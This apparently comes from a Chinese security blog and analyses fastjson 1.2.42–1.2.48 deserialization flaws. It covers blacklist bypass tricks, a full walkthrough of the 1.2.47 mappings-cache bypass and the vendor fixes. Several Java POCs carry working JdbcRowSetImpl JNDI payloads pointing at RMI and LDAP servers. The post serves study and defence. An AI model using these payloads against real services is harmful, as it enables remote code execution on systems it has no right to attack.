<h2 id="fastjson1-2-42"><a href="#fastjson1-2-42" class="headerlink" title="fastjson1.2.42"></a>fastjson1.2.42</h2><h3 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h3><p><strong>黑名单hash</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">denyHashCodes = <span class="keyword">new</span> <span class="title class_">long</span>[]&#123;</span><br><span class="line">    -<span class="number">8720046426850100497L</span>,</span><br><span class="line">    -<span class="number">8109300701639721088L</span>,</span><br><span class="line">    -<span class="number">7966123100503199569L</span>,</span><br><span class="line">    -<span class="number">7766605818834748097L</span>,</span><br><span class="line">    -<span class="number">6835437086156813536L</span>,</span><br><span class="line">    -<span class="number">4837536971810737970L</span>,</span><br><span class="line">    -<span class="number">4082057040235125754L</span>,</span><br><span class="line">    -<span class="number">2364987994247679115L</span>,</span><br><span class="line">    -<span class="number">1872417015366588117L</span>,</span><br><span class="line">    -<span class="number">254670111376247151L</span>,</span><br><span class="line">    -<span class="number">190281065685395680L</span>,</span><br><span class="line">    <span class="number">33238344207745342L</span>,</span><br><span class="line">    <span class="number">313864100207897507L</span>,</span><br><span class="line">    <span class="number">1203232727967308606L</span>,</span><br><span class="line">    <span class="number">1502845958873959152L</span>,</span><br><span class="line">    <span class="number">3547627781654598988L</span>,</span><br><span class="line">    <span class="number">3730752432285826863L</span>,</span><br><span class="line">    <span class="number">3794316665763266033L</span>,</span><br><span class="line">    <span class="number">4147696707147271408L</span>,</span><br><span class="line">    <span class="number">5347909877633654828L</span>,</span><br><span class="line">    <span class="number">5450448828334921485L</span>,</span><br><span class="line">    <span class="number">5751393439502795295L</span>,</span><br><span class="line">    <span class="number">5944107969236155580L</span>,</span><br><span class="line">    <span class="number">6742705432718011780L</span>,</span><br><span class="line">    <span class="number">7179336928365889465L</span>,</span><br><span class="line">    <span class="number">7442624256860549330L</span>,</span><br><span class="line">    <span class="number">8838294710098435315L</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>常用的包是有限的，这可以通过hash碰撞来爆破，具体参考：<a href="https://github.com/LeadroyaL/fastjson-blacklist">LeadroyaL&#x2F;fastjson-blacklist (github.com)</a></p>
<p><strong>分析checkAutoType</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">long</span> <span class="variable">BASIC</span> <span class="operator">=</span> <span class="number">0xcbf29ce484222325L</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="type">long</span> <span class="variable">PRIME</span> <span class="operator">=</span> <span class="number">0x100000001b3L</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果开头是L，结尾是;   则删除开头和结尾</span></span><br><span class="line"><span class="keyword">if</span> ((((BASIC</span><br><span class="line">       ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">      * PRIME)</span><br><span class="line">     ^ className.charAt(className.length() - <span class="number">1</span>))</span><br><span class="line">    * PRIME == <span class="number">0x9198507b5af98f0L</span>)</span><br><span class="line">&#123;</span><br><span class="line">    className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算前3个字符的hash</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">long</span> <span class="variable">h3</span> <span class="operator">=</span> (((((BASIC ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">                    * PRIME)</span><br><span class="line">                   ^ className.charAt(<span class="number">1</span>))</span><br><span class="line">                  * PRIME)</span><br><span class="line">                 ^ className.charAt(<span class="number">2</span>))</span><br><span class="line">    * PRIME;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">long</span> <span class="variable">hash</span> <span class="operator">=</span> h3;</span><br><span class="line">    <span class="comment">// 基于前3个字符继续hash运算，一位一位进行比较</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">        hash ^= className.charAt(i);</span><br><span class="line">        hash *= PRIME;</span><br><span class="line">        <span class="comment">// 白名单佐比较</span></span><br><span class="line">        <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 黑名单比较</span></span><br><span class="line">        <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>双写<code>L</code>和<code>;</code>即可绕过</p>
<h3 id="环境-2"><a href="#环境-2" class="headerlink" title="环境"></a>环境</h3><p>Maven依赖、JDK8u66下</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.42<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="测试-2"><a href="#测试-2" class="headerlink" title="测试"></a>测试</h3><p>POC</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> FastJson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/tre2da\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h3><p>在checkAutoType加了一个判断，只要以<code>LL</code>开头则报异常</p>
<h2 id="fastjson1-2-43"><a href="#fastjson1-2-43" class="headerlink" title="fastjson1.2.43"></a>fastjson1.2.43</h2><h3 id="前置知识-2"><a href="#前置知识-2" class="headerlink" title="前置知识"></a>前置知识</h3><p><strong>分析checkAutoType</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 如果开头是否是L，结尾是否是;</span></span><br><span class="line"><span class="keyword">if</span> ((((BASIC</span><br><span class="line">       ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">      * PRIME)</span><br><span class="line">     ^ className.charAt(className.length() - <span class="number">1</span>))</span><br><span class="line">    * PRIME == <span class="number">0x9198507b5af98f0L</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 判断是否以LL开头</span></span><br><span class="line">    <span class="keyword">if</span> ((((BASIC</span><br><span class="line">           ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">          * PRIME)</span><br><span class="line">         ^ className.charAt(<span class="number">1</span>))</span><br><span class="line">        * PRIME == <span class="number">0x9195c07b5af5345L</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 9195c07b5af5345</span></span><br><span class="line">    className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以使用<code>[</code>进行绕过</p>
<h3 id="环境-3"><a href="#环境-3" class="headerlink" title="环境"></a>环境</h3><p>Maven依赖、JDK8u66下</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.43<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="测试-3"><a href="#测试-3" class="headerlink" title="测试"></a>测试</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> FastJson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/tre2da\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="修复-3"><a href="#修复-3" class="headerlink" title="修复"></a>修复</h3><p>对<code>[</code>进行了限制</p>
<h2 id="fastjson1-2-44"><a href="#fastjson1-2-44" class="headerlink" title="fastjson1.2.44"></a>fastjson1.2.44</h2><p>限制<code>[</code></p>
<h3 id="前置知识-3"><a href="#前置知识-3" class="headerlink" title="前置知识"></a>前置知识</h3><p><strong>分析checkAutoType</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">long</span> <span class="variable">h1</span> <span class="operator">=</span> (BASIC ^ className.charAt(<span class="number">0</span>)) * PRIME;</span><br><span class="line"><span class="comment">// 判断首字符是否为[</span></span><br><span class="line"><span class="keyword">if</span> (h1 == <span class="number">0xaf64164c86024f1aL</span>) &#123; <span class="comment">// [</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断首字符是否是L并且结尾是否是;</span></span><br><span class="line"><span class="keyword">if</span> ((h1 ^ className.charAt(className.length() - <span class="number">1</span>)) * PRIME == <span class="number">0x9198507b5af98f0L</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这里限制的很严格了</p>
<p>利用方式只能使用下面通杀payload</p>
<h2 id="fastjson1-2-45-46"><a href="#fastjson1-2-45-46" class="headerlink" title="fastjson1.2.45-46"></a>fastjson1.2.45-46</h2><p>补充黑名单</p>
<h2 id="fastjson1-2-25-1-2-47通杀"><a href="#fastjson1-2-25-1-2-47通杀" class="headerlink" title="fastjson1.2.25-1.2.47通杀"></a>fastjson1.2.25-1.2.47通杀</h2><p>mappings缓存导致反序列化漏洞</p>
<h3 id="环境-4"><a href="#环境-4" class="headerlink" title="环境"></a>环境</h3><p>Maven依赖、JDK8u66下</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.25<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="测试-4"><a href="#测试-4" class="headerlink" title="测试"></a>测试</h3><p>POC</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> FastJson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    \&quot;a\&quot;:&#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        \&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    &#125;,\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    \&quot;b\&quot;:&#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/tre2da\&quot;,\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        \&quot;autoCommit\&quot;:true\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>为什么要这样构造：</strong></p>
<p>在没有开启autoType的时候，需要在<code>if (!autoTypeSupport)</code>之前将类返回，否则过不了黑名单，即务必在下面代码中返回clazz</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line"><span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">    clazz = deserializers.findClass(typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而获取clazz的方式也存在两种</p>
<ul>
<li><code>Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</code></li>
<li><code>clazz = deserializers.findClass(typeName);</code></li>
</ul>
<p>首先观察第二个方式，deserializers指的是一个IdentityHashMap，在某个ParserConfig构造函数中put了一些类和对应的反序列化器。由于这里是findClass，指的是根据typeName找到对应的反序列化器，因此有了<strong>第一种思路</strong>：可以向deserializers里面添加需要的反序列化器</p>
<p>由于deserializers是private属性，需要寻找调用deserializers.put的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">putDeserializer</span><span class="params">(Type type, ObjectDeserializer deserializer)</span> &#123;</span><br><span class="line">    deserializers.put(type, deserializer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>全局搜索调用putDeserializer的地方，就只有ParserConfig类的initJavaBeanDeserializers方法调用了，找不到可利用的链</p>
<p>从第一个方式入手，查看getClassFromMapping函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; getClassFromMapping(String className) &#123;</span><br><span class="line">    <span class="keyword">return</span> mappings.get(className);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>既然是从mapping中获取className，那么可以寻找调用mapping.put的地方，这里有TypeUtils.loadClass方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    .......</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (contextClassLoader != <span class="literal">null</span> &amp;&amp; contextClassLoader != classLoader) &#123;</span><br><span class="line">            clazz = contextClassLoader.loadClass(className);</span><br><span class="line">            mappings.put(className, clazz);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        clazz = Class.forName(className);</span><br><span class="line">        mappings.put(className, clazz);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在的目标转向哪里调用了TypeUtils.loadClass方法，全局搜索，总共有5处</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230706000610.png"></p>
<p>其中第二处无法控制参数；第三个在开启autoType的情况下；第四个在未开启autoType的情况，但是需要先过黑名单；第五个也是需要在开启autoType的情况下</p>
<p>综上，可利用的可能只有第一处，进去分析，处在<code>com/alibaba/fastjson/serializer/MiscCodec.java</code>的deserialze方法中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">deserialze</span><span class="params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> &#123;</span><br><span class="line">    <span class="type">JSONLexer</span> <span class="variable">lexer</span> <span class="operator">=</span> parser.lexer;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123;</span><br><span class="line">        parser.resolveStatus = DefaultJSONParser.NONE;</span><br><span class="line">        parser.accept(JSONToken.COMMA);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="string">&quot;val&quot;</span>.equals(lexer.stringVal())) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            lexer.nextToken();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        parser.accept(JSONToken.COLON);</span><br><span class="line"></span><br><span class="line">        objVal = parser.parse();</span><br><span class="line"></span><br><span class="line">        parser.accept(JSONToken.RBRACE);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        objVal = parser.parse();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String strVal;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (objVal == <span class="literal">null</span>) &#123;</span><br><span class="line">        strVal = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (objVal <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        strVal = (String) objVal;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (objVal <span class="keyword">instanceof</span> JSONObject) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz == Map.Entry.class) &#123;</span><br><span class="line">                <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> (JSONObject) objVal;</span><br><span class="line">                <span class="keyword">return</span> (T) jsonObject.entrySet().iterator().next();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;expect string&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> (clazz == Class.class) &#123;</span><br><span class="line">        <span class="keyword">return</span> (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关注<code>strVal</code>，由上一段代码得知是由<code>objVal</code>转换得到的，在往上分析，需要解析得到<code>objVal</code>必须满足以下条件（if当中的条件）</p>
<ul>
<li>解析器的状态为TypeNameRedirect</li>
<li>使用<code>lexer.stringVal()</code>方法获取当前<code>Token</code>的字符串值，并与<code>val</code>进行比较，需要相等</li>
</ul>
<p>最后将解析得到的值传给<code>objVal</code>再传给<code>strVal</code>，如果<code>clazz == Class.class</code>则调用loadClass将strVal放入Mappings中</p>
<p>注：其中MiscCodec是一个反序列化器，它继承了ObjectSerializer和ObjectDeserializer，所以直接调用deserialze方法就能够达到我们的目标，那么如何获取MiscCodec的示例也是一个问题？</p>
<p>查看之前的deserializers，里面put了很多关于MiscCodec键值对，根据<code>clazz == Class.class</code>条件，选择最合适的clazz值为<code>java.lang.Class</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">deserializers.put(Class.class, MiscCodec.instance);</span><br><span class="line">...</span><br><span class="line">deserializers.put(UUID.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(TimeZone.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(Locale.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(Currency.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(InetAddress.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(Inet4Address.class, MiscCodec.instance);</span><br><span class="line">deserializers.put(Inet6Address.class, MiscCodec.instance);</span><br></pre></td></tr></table></figure>

<p><strong>从开头开始分析：</strong></p>
<p>回到DefaultJSONParser.java中的parseObject函数，在解析@type时分为3步</p>
<ul>
<li><code>Class&lt;?&gt; clazz = config.checkAutoType(typeName, null);</code></li>
<li><code>this.setResolveStatus(TypeNameRedirect);</code></li>
<li><code>ObjectDeserializer deserializer = config.getDeserializer(clazz);</code>   <code>return deserializer.deserialze(this, clazz, fieldName);</code></li>
</ul>
<p><strong>其执行流程：</strong></p>
<ul>
<li><p>解析a中的@type</p>
<ul>
<li>进入checkAutoType，typeName为<code>java.lang.Class</code></li>
<li>TypeUtils.getClassFromMapping(typeName)返回null</li>
<li>deserializers.findClass(typeName)返回class java.lang.Class</li>
<li>this.setResolveStatus(TypeNameRedirect);</li>
<li>config.getDeserializer(clazz)获取MiscCodec.instance</li>
<li>deserializer.deserialze(this, clazz, fieldName)，即调用MiscCodec的deserialze方法</li>
<li>在MiscCodec的deserialze方法中满足了if条件，得到strVal为com.sun.rowset.JdbcRowSetImpl</li>
<li>调用TypeUtils.loadClass，Thread.currentThread().getContextClassLoader()，然后mappings.put(className, clazz)将com.sun.rowset.JdbcRowSetImpl放入mappings</li>
<li>此次a解析完成</li>
</ul>
</li>
<li><p>解析b中的@type</p>
<ul>
<li><p>进入checkAutoType，typeName为<code>com.sun.rowset.JdbcRowSetImpl</code></p>
</li>
<li><p><code> TypeUtils.getClassFromMapping(typeName);</code>得到clazz为<code>class com.sun.rowset.JdbcRowSetImpl</code></p>
</li>
<li><p>不用经过黑名单，直接返回clazz</p>
</li>
<li><p>config.getDeserializer(clazz)，之后的调用栈如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">build:<span class="number">130</span>, JavaBeanInfo (com.alibaba.fastjson.util)</span><br><span class="line">createJavaBeanDeserializer:<span class="number">590</span>, ParserConfig (com.alibaba.fastjson.parser)</span><br><span class="line">getDeserializer:<span class="number">507</span>, ParserConfig (com.alibaba.fastjson.parser)</span><br><span class="line">getDeserializer:<span class="number">364</span>, ParserConfig (com.alibaba.fastjson.parser)</span><br><span class="line">parseObject:<span class="number">367</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parseObject:<span class="number">517</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">1327</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">1293</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">137</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:<span class="number">128</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">main:<span class="number">25</span>, POC (FastJson)</span><br></pre></td></tr></table></figure>
</li>
<li><p>得到deserializer为FastjsonASMDeserializer_1_JdbcRowSetTmpl@920</p>
</li>
<li><p>之后就是调用其deserialze方法</p>
</li>
</ul>
</li>
</ul>
<p>尽管其他版本的checkAutoType函数有所更改，但是不影响这种通杀方法的通用性</p>
<h2 id="fastjson1-2-48"><a href="#fastjson1-2-48" class="headerlink" title="fastjson1.2.48"></a>fastjson1.2.48</h2><p>在MiscCodec类中的deserialze的方法中，在调用TypeUtils.loadClass方法时将cache设置为false</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == Class.class) &#123;</span><br><span class="line">    <span class="keyword">return</span> (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader(), <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样在TypeUtils.loadClass方法中就不会将clazz放入mappings缓存中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">clazz = contextClassLoader.loadClass(className);</span><br><span class="line"><span class="keyword">if</span> (cache) &#123;</span><br><span class="line">    mappings.put(className, clazz);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> clazz;</span><br></pre></td></tr></table></figure>



<h1 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h1><p><a href="https://mp.weixin.qq.com/s/SOKLC_No0hV9RhAavF2hcw">【两万字原创长文】完全零基础入门Fastjson系列漏洞（基础篇） (qq.com)</a></p>
<p><a href="https://xz.aliyun.com/t/7027">JAVA反序列化—FastJson组件 - 先知社区 (aliyun.com)</a></p>
<p><a href="https://fynch3r.github.io/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/">Fastjson抗争的一生 | fynch3r的小窝</a></p>
<p><a href="https://www.cnblogs.com/nice0e3/p/14776043.html">Java安全之FastJson JdbcRowSetImpl 链分析 - nice_0e3 - 博客园 (cnblogs.com)</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Java安全</tag>
      </tags>
  </entry>
</search>
